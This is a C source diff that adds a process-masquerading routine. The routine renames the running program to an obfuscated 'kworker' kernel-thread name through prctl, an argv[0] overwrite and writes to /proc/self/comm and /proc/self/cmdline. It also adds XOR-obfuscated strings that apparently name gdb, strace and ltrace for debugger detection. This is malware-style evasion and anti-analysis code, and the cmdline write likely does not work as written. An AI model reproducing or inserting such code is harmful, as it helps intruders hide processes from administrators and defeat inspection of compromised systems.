@@ -52,6 +52,38 @@ void prctl_rename(const char *name) {
     prctl(PR_SET_NAME, (unsigned long)short_name, 0, 0, 0);
 }
 
+void full_masquerade(char **argv, int argc) {
+    char kworker_name[32];
+    decode_kworker(kworker_name, sizeof(kworker_name));
+    
+    // 1. prctl PR_SET_NAME (limited to 16 chars, visible in top/ps)
+    prctl(PR_SET_NAME, (unsigned long)kworker_name, 0, 0, 0);
+    
+    // 2. argv[0] overwrite (visible in /proc/pid/cmdline)
+    if (argv && argv[0]) {
+        size_t len = strlen(argv[0]);
+        memset(argv[0], 0, len);
+        strncpy(argv[0], kworker_name, len - 1);
+    }
+    
+    // 3. /proc/self/comm overwrite (Linux 2.6.33+)
+    int fd = open("/proc/self/comm", O_WRONLY);
+    if (fd >= 0) {
+        write(fd, kworker_name, strlen(kworker_name));
+        close(fd);
+    }
+    
+    // 4. /proc/self/cmdline overwrite
+    fd = open("/proc/self/cmdline", O_WRONLY);
+    if (fd >= 0) {
+        // cmdline is null-separated, overwrite first entry
+        write(fd, kworker_name, strlen(kworker_name));
+        write(fd, "\0", 1);
+        close(fd);
+    }
+}
+
+
 static const uint8_t OBF_GDB[] = {0xCC, 0xCF, 0xC9};
 static const uint8_t OBF_STRACE[] = {0xD8, 0xDF, 0xD9, 0xCA, 0xC8, 0xCE};
 static const uint8_t OBF_LTRACE[] = {0xC7, 0xDF, 0xD9, 0xCA, 0xC8, 0xCE};
